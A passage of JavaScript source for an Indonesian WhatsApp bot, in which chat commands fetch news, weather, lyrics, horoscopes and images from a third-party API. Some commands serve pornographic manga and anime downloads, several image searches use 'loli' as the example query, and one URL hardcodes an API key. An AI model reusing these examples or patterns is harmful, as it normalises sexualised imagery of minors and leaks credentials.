                    ini_txt += `Character : ${get_info.characters.join(", ")}\n`
                    ini_txt += `Tags : ${get_info.tags.join(", ")}\n`
                    ini_txt += `Artist : ${get_info.artists}\n`
                    ini_txt += `Group : ${get_info.groups}\n`
                    ini_txt += `Languager : ${get_info.languages.join(", ")}\n`
                    ini_txt += `Categories : ${get_info.categories}\n`
                    ini_txt += `Pages : ${get_info.pages}\n`
                    ini_txt += `Uploaded : ${get_info.uploaded}\n`
                    reply(ini_txt)
                    break
                case 'nhentaipdf':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (!isPrem) return reply(`Perintah ini hanya khusus Premium Ketik ${prefix}owner Untuk Membeli Premium`)
                    if (args.length == 0) return reply(`Example: ${prefix + command} 12345`)
                    henid = args[0]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/nhentaipdf/${henid}?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_buffer = await getBuffer(get_result)
                    zacky.sendMessage(from, ini_buffer, document, { quoted: mek, mimetype: Mimetype.pdf, filename: `${henid}.pdf` })
                    break
                case 'nhentaisearch':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/nhentaisearch?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = "Result : \n"
                    for (var x of get_result) {
                        ini_txt += `Id : ${x.id}\n`
                        ini_txt += `Title English : ${x.title_english}\n`
                        ini_txt += `Title Japanese : ${x.title_japanese}\n`
                        ini_txt += `Native : ${x.title_native}\n`
                        ini_txt += `Upload : ${x.date_upload}\n`
                        ini_txt += `Page : ${x.page}\n`
                        ini_txt += `Favourite : ${x.favourite}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'nekopoi':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://nekopoi.care/isekai-harem-monogatari-episode-4-subtitle-indonesia/`)
                    ini_url = args[0]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/nekopoi?apikey=${lolkey}&url=${ini_url}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.anime}\n`
                    ini_txt += `Porducers : ${get_result.producers}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Size : ${get_result.size}\n`
                    ini_txt += `Sinopsis : ${get_result.sinopsis}\n`
                    link = get_result.link
                    for (var x in link) {
                        ini_txt += `\n${link[x].name}\n`
                        link_dl = link[x].link
                        for (var y in link_dl) {
                            ini_txt += `${y} - ${link_dl[y]}\n`
                        }
                    }
                    ini_buffer = await getBuffer(get_result.thumb)
                    zacky.sendMessage(from, ini_buffer, image, { quoted: mek, caption: ini_txt })
                    break
                case 'nekopoisearch':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Example: ${prefix + command} Isekai Harem`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/nekopoisearch?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = ""
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Thumbnail : ${x.thumbnail}\n\n`
                    }
                    reply(ini_txt)
                    break

                    // Information //
                case 'heroml':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (!isPrem) return reply(`Perintah ini hanya khusus Premium Ketik ${prefix}owner Untuk Membeli Premium`)
                    if (args.length == 0) return reply(`Example: ${prefix + command} Fanny`)
                    hero = args[0]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/heroml/${hero}?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = `Name : ${get_result.hero_name}\n`
                    ini_txt += `Entrance Quotes : ${get_result.ent_quotes}\n`
                    ini_txt += `Role : ${get_result.detail.role}\n`
                    ini_txt += `Specialty : ${get_result.detail.specialty}\n`
                    ini_txt += `Laning : ${get_result.detail.laning_recommendation}\n`
                    ini_txt += `Release : ${get_result.detail.release_date}\n`
                    ini_txt += `Movement speed : ${get_result.attr.movement_speed}\n`
                    ini_txt += `Physical attack : ${get_result.attr.physical_attack}\n`
                    ini_txt += `Magic power : ${get_result.attr.magic_power}\n`
                    ini_txt += `Physical defense : ${get_result.attr.physical_defense}\n`
                    ini_txt += `Magic defense : ${get_result.attr.magic_defense}\n`
                    ini_txt += `Critical rate : ${get_result.attr.basic_atk_crit_rate}\n`
                    ini_txt += `Hp : ${get_result.attr.hp}\n`
                    ini_txt += `Mana : ${get_result.attr.mana}\n`
                    ini_txt += `Mana regen : ${get_result.attr.mana_regen}\n`
                    ini_icon = await getBuffer(get_result.icon)
                    zacky.sendMessage(from, ini_icon, image, { quoted: mek, caption: ini_txt })
                    break
                case 'wikipedia':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Example: ${prefix + command} Tahu`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/wiki?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    reply(get_result)
                    break
                case 'translate':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Example: ${prefix + command} en Tahu Bacem`)
                    kode_negara = args[0]
                    args.shift()
                    ini_txt = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/translate/auto/${kode_negara}?apikey=${lolkey}&text=${ini_txt}`)
                    get_result = get_result.result
                    init_txt = `From : ${get_result.from}\n`
                    init_txt += `To : ${get_result.to}\n`
                    init_txt += `Original : ${get_result.original}\n`
                    init_txt += `Translated : ${get_result.translated}\n`
                    init_txt += `Pronunciation : ${get_result.pronunciation}\n`
                    reply(init_txt)
                    break
                case 'brainly':
        if (isBanned) return reply('Maaf kamu sudah terbenned!')
					if (args.length < 1) return reply('Pertanyaan apa')
		          	brien = args.join(' ')
					brainly(`${brien}`).then(res => {
					teks = '❉───────────────────────❉\n'
					for (let Y of res.data) {
					teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉─────────────────────┈ ⳹\n`
					}
					zacky.sendMessage(from, teks, text,{quoted:mek,detectLinks: false})                        
		            })              
					break
				case 'brainly2':
					if (args.length < 1) return reply('Pertanyaan apa')
		          	brien = args.join(' ')
					brainly(`${brien}`).then(res => {
					teks = '❉───────────────────────❉\n'
					for (let Y of res.data) {
					teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉──────────────────❉\n`
					}
					zacky.sendMessage(from, teks, text,{quoted:mek,detectLinks: false})                        
		            }).catch(e => {
					reply('Terjadi kesalahan, coba beberapa saat lagi')
					})             
					break
                case 'jadwaltv':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Example: ${prefix + command} RCTI`)
                    channel = args[0]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/jadwaltv/${channel}?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = `Jadwal TV ${channel.toUpperCase()}\n`
                    for (var x in get_result) {
                        ini_txt += `${x} - ${get_result[x]}\n`
                    }
                    reply(ini_txt)
                    break
                case 'jadwaltvnow':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/jadwaltv/now?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = `Jadwal TV Now :\n`
                    for (var x in get_result) {
                        ini_txt += `${x.toUpperCase()}${get_result[x]}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'newsinfo':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/newsinfo?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = "Result :\n"
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Author : ${x.author}\n`
                        ini_txt += `Source : ${x.source.name}\n`
                        ini_txt += `Url : ${x.url}\n`
                        ini_txt += `Published : ${x.publishedAt}\n`
                        ini_txt += `Description : ${x.description}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'cnnindonesia':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/cnnindonesia?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = "Result :\n"
                    for (var x of get_result) {
                        ini_txt += `Judul : ${x.judul}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Tipe : ${x.tipe}\n`
                        ini_txt += `Published : ${x.waktu}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'cnnnasional':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/cnnindonesia/nasional?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = "Result :\n"
                    for (var x of get_result) {
                        ini_txt += `Judul : ${x.judul}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Tipe : ${x.tipe}\n`
                        ini_txt += `Published : ${x.waktu}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'cnninternasional':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/cnnindonesia/internasional?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = "Result :\n"
                    for (var x of get_result) {
                        ini_txt += `Judul : ${x.judul}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Tipe : ${x.tipe}\n`
                        ini_txt += `Published : ${x.waktu}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'infogempa':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (!isPrem) return reply(`Perintah ini hanya khusus Premium Ketik ${prefix}owner Untuk Membeli Premium`)
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/infogempa?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = `Lokasi : ${get_result.lokasi}\n`
                    ini_txt += `Waktu : ${get_result.waktu}\n`
                    ini_txt += `Potensi : ${get_result.potensi}\n`
                    ini_txt += `Magnitude : ${get_result.magnitude}\n`
                    ini_txt += `Kedalaman : ${get_result.kedalaman}\n`
                    ini_txt += `Koordinat : ${get_result.koordinat}`
                    get_buffer = await getBuffer(get_result.map)
                    zacky.sendMessage(from, get_buffer, image, { quoted: mek, caption: ini_txt })
                    break
                case 'lirik':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/lirik?apikey=${lolkey}&query=${query}`)
                    reply(get_result.result)
                    break
                case 'cuaca':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Example: ${prefix + command} Yogyakarta`)
                    daerah = args[0]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/cuaca/${daerah}?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = `Tempat : ${get_result.tempat}\n`
                    ini_txt += `Cuaca : ${get_result.cuaca}\n`
                    ini_txt += `Angin : ${get_result.angin}\n`
                    ini_txt += `Description : ${get_result.description}\n`
                    ini_txt += `Kelembapan : ${get_result.kelembapan}\n`
                    ini_txt += `Suhu : ${get_result.suhu}\n`
                    ini_txt += `Udara : ${get_result.udara}\n`
                    ini_txt += `Permukaan laut : ${get_result.permukaan_laut}\n`
                    zacky.sendMessage(from, { degreesLatitude: get_result.latitude, degreesLongitude: get_result.longitude }, location, { quoted: mek})
                    reply(ini_txt)
                    break
                case 'covidindo':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/corona/indonesia?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = `Positif : ${get_result.positif}\n`
                    ini_txt += `Sembuh : ${get_result.sembuh}\n`
                    ini_txt += `Dirawat : ${get_result.dirawat}\n`
                    ini_txt += `Meninggal : ${get_result.meninggal}`
                    reply(ini_txt)
                    break
                case 'covidglobal':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/corona/global?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = `Positif : ${get_result.positif}\n`
                    ini_txt += `Sembuh : ${get_result.sembuh}\n`
                    ini_txt += `Dirawat : ${get_result.dirawat}\n`
                    ini_txt += `Meninggal : ${get_result.meninggal}`
                    reply(ini_txt)
                    break
                case 'kodepos':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Example: ${prefix + command} Slemanan or ${prefix + command} 66154`)
                    daerah = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/kodepos?apikey=${lolkey}&query=${daerah}`)
                    get_result = get_result.result[0]
                    ini_txt = `Provinsi : ${get_result.province}\n`
                    ini_txt += `Kabupaten : ${get_result.city}\n`
                    ini_txt += `Kecamatan : ${get_result.subdistrict}\n`
                    ini_txt += `Kelurahan : ${get_result.urban}\n`
                    ini_txt += `Kode Pos : ${get_result.postalcode}`
                    reply(ini_txt)
                    break
                case 'jadwalbola':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/jadwalbola?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = "Jadwal Bola :\n"
                    for (var x of get_result) {
                        ini_txt += `Hari : ${x.hari}\n`
                        ini_txt += `Jam : ${x.jam}\n`
                        ini_txt += `Event : ${x.event}\n`
                        ini_txt += `Match : ${x.match}\n`
                        ini_txt += `TV : ${x.tv}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'indbeasiswa':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/indbeasiswa?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = 'Info Beasiswa :\n'
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Link : ${x.link}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'hoax':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/turnbackhoax?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = 'Info Hoax :\n'
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Posted : ${x.posted}\n`
                        ini_txt += `Description : ${x.desc}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'nsfwcheck':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (!isPrem) return reply(`Perintah ini hanya khusus Premium Ketik ${prefix}owner Untuk Membeli Premium`)
                    if ((isMedia && !lol.message.videoMessage || isQuotedImage) && args.length == 0) {
                        const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                        const filePath = await zacky.downloadAndSaveMediaMessage(encmedia, filename = getRandom());
                        const form = new FormData();
                        const stats = fs.statSync(filePath);
                        const fileSizeInBytes = stats.size;
                        const fileStream = fs.createReadStream(filePath);
                        form.append('img', fileStream, { knownLength: fileSizeInBytes });
                        const options = {
                            method: 'POST',
                            credentials: 'include',
                            body: form
                        }
                        get_result = await fetchJson(`http://api.lolhuman.xyz/api/nsfwcheck?apikey=${lolkey}`, {...options })
                        fs.unlinkSync(filePath)
                        get_result = get_result.result
                        is_nsfw = "No"
                        if (Number(get_result.replace("%", "")) >= 50) is_nsfw = "Yes"
                        reply(`Is NSFW? ${is_nsfw}\nNSFW Score : ${get_result}`)
                    } else {
                        reply(`Kirim gambar dengan caption ${prefix + command} atau tag gambar yang sudah dikirim`)
                    }
                    break

                    // Movie & Story
                case 'lk21':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Example: ${prefix + command} Transformer`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/lk21?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Link : ${get_result.link}\n`
                    ini_txt += `Genre : ${get_result.genre}\n`
                    ini_txt += `Views : ${get_result.views}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Tahun : ${get_result.tahun}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Desc : ${get_result.desc}\n`
                    ini_txt += `Actors : ${get_result.actors.join(", ")}\n`
                    ini_txt += `Location : ${get_result.location}\n`
                    ini_txt += `Date Release : ${get_result.date_release}\n`
                    ini_txt += `Language : ${get_result.language}\n`
                    ini_txt += `Link Download : ${get_result.link_dl}`
                    thumbnail = await getBuffer(get_result.thumbnail)
                    zacky.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
                    break
                case 'drakorongoing':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/drakorongoing?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = "Ongoing Drakor\n\n"
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Thumbnail : ${x.thumbnail}\n`
                        ini_txt += `Year : ${x.category}\n`
                        ini_txt += `Total Episode : ${x.total_episode}\n`
                        ini_txt += `Genre : ${x.genre.join(", ")}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'wattpad':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.wattpad.com/707367860-kumpulan-quote-tere-liye-tere-liye-quote-quote`)
                    ini_url = args[0]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/wattpad?apikey=${lolkey}&url=${ini_url}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Motify date : ${get_result.modifyDate}\n`
                    ini_txt += `Create date: ${get_result.createDate}\n`
                    ini_txt += `Word : ${get_result.word}\n`
                    ini_txt += `Comment : ${get_result.comment}\n`
                    ini_txt += `Vote : ${get_result.vote}\n`
                    ini_txt += `Reader : ${get_result.reader}\n`
                    ini_txt += `Pages : ${get_result.pages}\n`
                    ini_txt += `Description : ${get_result.desc}\n\n`
                    ini_txt += `Story : \n${get_result.story}`
                    thumbnail = await getBuffer(get_result.photo)
                    zacky.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
                    break
                case 'wattpadsearch':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Example: ${prefix + command} Tere Liye`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/wattpadsearch?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = "Wattpad Seach : \n"
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Url : ${x.url}\n`
                        ini_txt += `Part : ${x.parts}\n`
                        ini_txt += `Motify date : ${x.modifyDate}\n`
                        ini_txt += `Create date: ${x.createDate}\n`
                        ini_txt += `Coment count: ${x.commentCount}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'cerpen':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/cerpen?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Creator : ${get_result.creator}\n`
                    ini_txt += `Story :\n${get_result.cerpen}`
                    reply(ini_txt)
                    break
                case 'ceritahoror':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/ceritahoror?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Desc : ${get_result.desc}\n`
                    ini_txt += `Story :\n${get_result.story}\n`
                    thumbnail = await getBuffer(get_result.thumbnail)
                    zacky.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
                    break

                    // Random Text //
                case 'quotes':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    quotes = await fetchJson(`http://api.lolhuman.xyz/api/random/quotes?apikey=${lolkey}`)
                    quotes = quotes.result
                    author = quotes.by
                    quotes = quotes.quote
                    reply(`_${quotes}_\n\n*â€• ${author}*`)
                    break
                case 'quotesanime':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (!isPrem) return reply(`Perintah ini hanya khusus Premium Ketik ${prefix}owner Untuk Membeli Premium`)
                    quotes = await fetchJson(`http://api.lolhuman.xyz/api/random/quotesnime?apikey=${lolkey}`)
                    quotes = quotes.result
                    quote = quotes.quote
                    char = quotes.character
                    anime = quotes.anime
                    episode = quotes.episode
                    reply(`_${quote}_\n\n*â€• ${char}*\n*â€• ${anime} ${episode}*`)
                    break
                case 'quotesdilan':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    quotedilan = await fetchJson(`http://api.lolhuman.xyz/api/quotes/dilan?apikey=${lolkey}`)
                    reply(quotedilan.result)
                    break
                case 'quotesimage':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		buffer = await getBuffer(`http://lolhuman.herokuapp.com/api/random/quotesimage?apikey=KatoNiBoss`)
		zacky.sendMessage(from, buffer, image, { quoted: mek})
		break
                case 'faktaunik':
                case 'katabijak':
                case 'pantun':
                case 'bucin':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/random/${command}?apikey=${lolkey}`)
                    reply(get_result.result)
                    break
                case 'randomnama':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    anu = await fetchJson(`http://api.lolhuman.xyz/api/random/nama?apikey=${lolkey}`)
                    reply(anu.result)
                    break

                    // Searching
                case 'gimage':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Example: ${prefix + command} loli`)
                    query = args.join(" ")
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolkey}&query=${query}`)
                    zacky.sendMessage(from, ini_buffer, image, { quoted: mek})
                    break
                case 'gimage2':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Example: ${prefix + command} loli`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/gimage2?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    for (var x = 0; x <= 5; x++) {
                        var ini_buffer = await getBuffer(get_result[x])
                        zacky.sendMessage(from, ini_buffer, image)
                    }
                    break
                case 'konachan':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Example: ${prefix + command} azur_lane`)
                    query = args.join(" ")
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/konachan?apikey=${lolkey}&query=${query}`)
                    zacky.sendMessage(from, ini_buffer, image, { quoted: mek})
                    break
                case 'wallpapersearch':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (!isPrem) return reply(`Perintah ini hanya khusus Premium Ketik ${prefix}owner Untuk Membeli Premium`)
                    if (args.length == 0) return reply(`Example: ${prefix + command} loli`)
                    query = args.join(" ")
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/wallpaper?apikey=${lolkey}&query=${query}`)
                    zacky.sendMessage(from, ini_buffer, image, { quoted: mek})
                    break
                case 'wallpapersearch2':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (!isPrem) return reply(`Perintah ini hanya khusus Premium Ketik ${prefix}owner Untuk Membeli Premium`)
                    if (args.length == 0) return reply(`Example: ${prefix + command} loli`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/wallpaper2?apikey=${lolkey}&query=${query}`)
                    ini_buffer = await getBuffer(get_result.result)
                    zacky.sendMessage(from, ini_buffer, image, { quoted: mek})
                    break                
                case 'shopee':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                shopp = `${body.slice(8)}`
                  anu = await fetchJson(`http://lolhuman.herokuapp.com/api/shopee?apikey=${lolkey}&query=${shopp}`, {method: 'get'})
                  shopee = '==========================\n'
                  for (let disho of anu.result){
                  shopee += `â€¢ Name: ${disho.name}\nâ€¢ Terjual: ${disho.sold}\nâ€¢ Stock: ${disho.stock}\nâ€¢ Desk: ${disho.desc}\nâ€¢ Lokasi: ${disho.shop_loc}\nâ€¢ Link: ${disho.link_produk}\nâ€¢ Gambar: ${disho.image_cover}\n==========================\n`
                  }
                  reply(shopee.trim())
                  break
                case 'google':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (isBanned) return reply('Lu sudah terbenned!')
                    if (args.length == 0) return reply(`Example: ${prefix + command} loli`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/gsearch?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = 'Google Search : \n'
                    for (var x of get_result) {
                        ini_txt += `â€¢ Title : ${x.title}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Desc : ${x.desc}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'stickerwa':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (isBanned) return reply('Lu sudah terbenned!')
		if (args.length == 0) return reply(`Example: ${prefix + command} Koceng Imot`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/stickerwa?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result[0].stickers
                    for (var x of get_result) {
                        ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/convert/towebp?apikey=${lolkey}&img=${x}`)
                        zacky.sendMessage(from, ini_buffer, sticker)
                    }
                    break

                    // Primbon
                case 'artinama':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Example: ${prefix + command} ${pushname}`)
                    ini_nama = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/artinama?apikey=${lolkey}&nama=${ini_nama}`)
                    reply(get_result.result)
                    break
                case 'jodoh':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Example: ${prefix + command} Tahu & Bacem`)
                    ini_nama = args.join(" ").split("&")
                    nama1 = ini_nama[0].trim()
                    nama2 = ini_nama[1].trim()
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/jodoh/${nama1}/${nama2}?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = `Positif : ${get_result.positif}\n`
                    ini_txt += `Negative : ${get_result.negatif}\n`
                    ini_txt += `Deskripsi : ${get_result.deskripsi}`
                    reply(ini_txt)
                    break
                case 'weton':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Example: ${prefix + command} 12 12 2020`)
                    tanggal = args[0]
                    bulan = args[1]
                    tahun = args[2]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/weton/${tanggal}/${bulan}/${tahun}?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = `Weton : ${get_result.weton}\n`
                    ini_txt += `Pekerjaan : ${get_result.pekerjaan}\n`
                    ini_txt += `Rejeki : ${get_result.rejeki}\n`
                    ini_txt += `Jodoh : ${get_result.jodoh}`
                    reply(ini_txt)
                    break
                case 'jadian':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Example: ${prefix + command} 12 12 2020`)
                    tanggal = args[0]
                    bulan = args[1]
                    tahun = args[2]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/jadian/${tanggal}/${bulan}/${tahun}?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = `Karakteristik : ${get_result.karakteristik}\n`
